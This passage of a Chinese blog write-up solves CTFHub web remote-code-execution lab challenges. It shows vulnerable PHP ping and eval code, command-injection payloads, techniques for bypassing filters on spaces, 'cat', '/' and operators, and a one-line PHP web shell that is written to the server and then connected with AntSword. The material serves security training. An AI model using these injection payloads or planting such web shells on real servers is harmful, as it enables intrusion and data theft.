class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span>函数、<br>preg_replace、<br>create_function函数、<br>array_map、<br>call_user_func、<br>assert、<br>call_user_func_array、<br>array_filter、<br>uasor <br></code></pre></td></tr></table></figure><p>PHP代码命令执行变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">popen、<br>proc_popen、<br>passthru、<br>system变量、<br><span class="hljs-built_in">exec</span>变量、<br>shell_exec、<br>pcntl_exec。<br></code></pre></td></tr></table></figure><h1 id="CTFHub-Web-RCE练习"><a href="#CTFHub-Web-RCE练习" class="headerlink" title="CTFHub-Web-RCE练习"></a>CTFHub-Web-RCE练习</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看根目录文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201208153824782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看下一级目录,发现flag_23816文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;ls /&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020120918423712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用cat命令读取文件,找到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;cat /flag_23816&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201209184311919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//blog.csdn.net/Xxy605/article/details/107548841?utm_medium=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control</span><br></code></pre></td></tr></table></figure><h2 id="命令注入-无过滤"><a href="#命令注入-无过滤" class="headerlink" title="命令注入-无过滤"></a>命令注入-无过滤</h2><p>这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br><span class="hljs-variable">$res</span> = FALSE;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 &#123;<span class="hljs-variable">$_GET</span>[&#x27;ip&#x27;]&#125;&quot;</span>;<br>    <span class="hljs-built_in">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ping一下127.0.0.1<br><img src="https://img-blog.csdnimg.cn/20201210184652619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?ip=|ls<br></code></pre></td></tr></table></figure><p>发现了25900911724350.php<br><img src="https://img-blog.csdnimg.cn/20201211103127797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用cat读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=|cat <span class="hljs-number">25900911724350.</span>php<br></code></pre></td></tr></table></figure><p>无回显，可能存在字符编码无法显示出来<br><img src="https://img-blog.csdnimg.cn/20201210184802952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看网页源代码<br><img src="https://img-blog.csdnimg.cn/20201211103237831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还可以利用管道符，通过base64的形式显示文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=|cat <span class="hljs-number">25900911724350.</span>php|base64<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201211103751285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码，得到flag<br><img src="https://img-blog.csdnimg.cn/20201210185039373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还可以写码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; a.php <br></code></pre></td></tr></table></figure><p>执行<code>?ip=;ls</code>，发现写入成功<br><img src="https://img-blog.csdnimg.cn/20201211104044953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>蚁剑连接，数据返回为空<br><img src="https://img-blog.csdnimg.cn/20201211104308449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>需要注意echo命令会调用<code>$_POST</code>导致原始文件中没有,一句话木马里面 <code>$_POST</code> 前加上  <code>\</code>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; b.php <br></code></pre></td></tr></table></figure><p>b.php写入成功<br><img src="https://img-blog.csdnimg.cn/20201211104639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑连接成功<br><img src="https://img-blog.csdnimg.cn/20201211104731952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤cat"><a href="#命令注入-过滤cat" class="headerlink" title="命令注入-过滤cat"></a>命令注入-过滤cat</h2><p>题目描述：过滤了cat命令之后，你还有什么方法能读到 Flag?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/cat/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?ip=|ls<br></code></pre></td></tr></table></figure><p>发现了flag_22422157929595.php<br><img src="https://img-blog.csdnimg.cn/20201211110314508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>题目说过滤了cat，绕过cat</p><ol><li> 单引号或双引号绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca<span class="hljs-string">&#x27;&#x27;</span>t flag_22422157929595.php<br>?ip=|ca<span class="hljs-string">&quot;&quot;</span>t  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>反斜杠绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca\t  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>利用Shell 特殊变量绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca<span class="hljs-variable">$@t</span>  flag_22422157929595.php<br>?ip=|ca<span class="hljs-variable">$1t</span>  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>linux中直接查看文件内容的命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat、tac、more、less、head、tail、file -f、nl、sed、sort、uniq<br><br>cat： 由第一行开始显示档案内容<br>tac： 从最后一行开始显示，可以看出 tac 是 cat 的反向显示！<br>nl： 显示的时候，随便输出行号！<br>more： 一页一页的显示档案内容<br>less 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页！<br>head： 查看头几行<br>tail： 查看尾几行<br>od： 以二进制的方式读取档案内容！<br>最常使用的显示档案内容的指令可以说是 cat ，more 及 less 了！<br></code></pre></td></tr></table></figure></li></ol><p>   cat被过滤了，可以使用其他命令，花式Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|tac flag_22422157929595.php<br>?ip=|more flag_22422157929595.php<br>?ip=|less flag_22422157929595.php<br>?ip=|head flag_22422157929595.php<br>?ip=|tail flag_22422157929595.php<br>?ip=|file -f flag_22422157929595.php<br>?ip=|nl flag_22422157929595.php<br>?ip=|sed flag_22422157929595.php<br>?ip=|sort flag_22422157929595.php<br>?ip=|uniq flag_22422157929595.php<br></code></pre></td></tr></table></figure><h2 id="命令注入-过滤空格"><a href="#命令注入-过滤空格" class="headerlink" title="命令注入-过滤空格"></a>命令注入-过滤空格</h2><p>题目描述：这次过滤了空格，你能绕过吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先查询目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116153811306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|cat flag_177172732728132.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116154101457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>空格被过滤了，用以下字符代替空格：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt; 、&lt;&gt;、%<span class="hljs-number">20</span>(space)、%<span class="hljs-number">09</span>(tab)、$IFS$<span class="hljs-number">9</span>、 $&#123;IFS&#125;、<span class="hljs-variable">$IFS</span>  <br></code></pre></td></tr></table></figure><p>新的Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|cat<span class="hljs-variable">$&#123;IFS&#125;</span>flag_177172732728132.php<br></code></pre></td></tr></table></figure><p>查看源代码即可得到flag</p><h2 id="命令注入-过滤目录分隔符"><a href="#命令注入-过滤目录分隔符" class="headerlink" title="命令注入-过滤目录分隔符"></a>命令注入-过滤目录分隔符</h2><p>题目描述：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/\//&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>老规矩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116134511443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一些命令分隔符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">linux中：%<span class="hljs-number">0</span>a 、%<span class="hljs-number">0</span>d 、; 、&amp; 、| 、&amp;&amp;、||<br>windows中：%<span class="hljs-number">0</span>a、&amp;、|、%<span class="hljs-number">1</span>a（一个神奇的角色，作为.bat文件中的命令分隔符）<br></code></pre></td></tr></table></figure><p>由于过滤了目录分隔符 <code>/</code>  ，需要切换到相应目录，并使用 <code>;</code> 分隔符连续执行指令　</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=;<span class="hljs-built_in">cd</span> flag_is_here;ls<br></code></pre></td></tr></table></figure><p>cd  进入flag_is_here目录，ls  显示flag_is_here目录里的内容。<br><img src="https://img-blog.csdnimg.cn/20210116134947994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?ip=;<span class="hljs-built_in">cd</span> flag_is_here;cat flag_3708221509571.php<br></code></pre></td></tr></table></figure><p>查看源代码，拿到flag<br><img src="https://img-blog.csdnimg.cn/20210116135639397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤运算符"><a href="#命令注入-过滤运算符" class="headerlink" title="命令注入-过滤运算符"></a>命令注入-过滤运算符</h2><p>题目描述：过滤了几个运算符, 要怎么绕过呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||\&amp;)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从代码中，可以看出过滤了 <code>|</code> 与 <code>&amp;</code>运算符 ，那我们就使用 <code>;</code> 分隔符绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=;ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116140338276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=;cat flag_64982941521735.php<br></code></pre></td></tr></table></figure><p>查看源代码<br><img src="https://img-blog.csdnimg.cn/20210116140509312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>题目描述：同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码，发现过滤了<code>|、&amp;、;、空格、/、cat</code>，以及<code>flag和ctfhub</code>等关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.查看目录结构：<br>源命令：|ls<br><span class="hljs-comment">#%0a代替运算符|</span><br>Payload:?ip=%0als<br><br>2.查看flag_is_here文件夹下的文件<br>源命令：;<span class="hljs-built_in">cd</span> flag_is_here;ls<br><span class="hljs-comment">#%0a绕过运算符和;</span><br><span class="hljs-comment">#$&#123;IFS&#125;代替空格</span><br><span class="hljs-comment">#flag被过滤了，使用通配符*绕过</span><br>Payload:?ip=%0acd<span class="hljs-variable">$&#123;IFS&#125;</span>*_is_here%0als<br><br>3.查看flag文件内容<br>源命令：?ip=;<span class="hljs-built_in">cd</span> flag_is_here;cat flag_216371105627974.php<br><span class="hljs-comment">#使用more代替cat</span><br>Payload:?ip=%0acd<span class="hljs-variable">$&#123;IFS&#125;</span>*_is_here%0amore%09*_216371105627974.php <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（四）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="http://atkx.top/tags/CTFhub/"/>
    
    <category term="命令执行" scheme="http://atkx.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
